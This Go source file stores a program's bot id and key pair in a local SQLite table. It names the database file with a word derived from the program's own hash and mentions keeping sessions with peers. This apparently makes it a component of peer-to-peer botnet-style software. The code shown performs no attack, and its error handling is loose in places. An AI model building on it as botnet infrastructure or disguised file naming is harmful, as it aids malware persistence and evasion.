package main

import (
	"database/sql"
	"fmt"

	_ "github.com/mattn/go-sqlite3"
)

// Model of 'details' table.
type BotDetails struct {
	Id         string `json:"id"`
	PublicKey  string `json:"public_key"`
	PrivateKey string `json:"private_key"`
}

// Database connection.
var db *sql.DB

// dbInit creates the database file and runs the migration.
func dbInit() error {
	databaseName := randomPopularWordBySeed(integersFromString(selfHash))

	database, err := sql.Open("sqlite3", "./"+databaseName+".db")
	if err != nil {
		return err
	}
	db = database

	// Create a table where the bot will save details about itself.
	statement, err := database.Prepare("CREATE TABLE IF NOT EXISTS details (id TEXT, private_key TEXT, public_key TEXT)")
	if err != nil {
		return err
	}
	statement.Exec()

	return nil
}

// dbGetBotDetails returns details about the bot, such are: id, private key and public key.
func dbGetBotDetails() (BotDetails, error) {
	details := BotDetails{}

	rows, err := db.Query("SELECT id, private_key, public_key FROM details LIMIT 1")
	if err != nil {
		return details, nil
	}

	for rows.Next() {
		rows.Scan(&details.Id, &details.PrivateKey, &details.PublicKey)
	}

	return details, nil
}

// dbInsertBotDetails saves basic information about the bot so that it can maintain session with other services and peers.
func dbInsertBotDetails(id, privateKey, publicKey string) error {
	statement, err := db.Prepare("INSERT INTO details (id, private_key, public_key) VALUES (?, ?, ?)")
	if err != nil {
		fmt.Println(err)
		return err
	}

	statement.Exec(id, privateKey, publicKey)

	return nil
}
